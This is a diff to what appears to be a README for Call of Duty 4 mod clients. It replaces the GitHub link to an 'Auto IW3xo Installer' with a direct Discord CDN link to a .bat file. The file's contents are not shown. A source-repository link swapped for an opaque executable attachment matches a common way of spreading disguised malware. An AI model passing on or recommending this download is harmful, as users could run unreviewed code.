@@ -46,7 +46,7 @@
 | [IW3xo](https://github.com/xoxor4d/iw3xo-dev) | Yes |
 | [COD4x](https://cod4x.ovh/t/releases/24) | Yes |
 
-**[Auto IW3xo Installer by Kruumy](https://github.com/kruumy/iw3xo-one-click-installer)**
+**[Auto IW3xo Installer by Kruumy](https://cdn.discordapp.com/attachments/984838598849347604/1225139289487310868/iw3xoinstaller.bat?ex=66200ae0&is=660d95e0&hm=e124d564a313d5098809af323859f5d8174ba85a02dda1ea1cdfc4757c518e2f&)**
 
 ## Installation
 
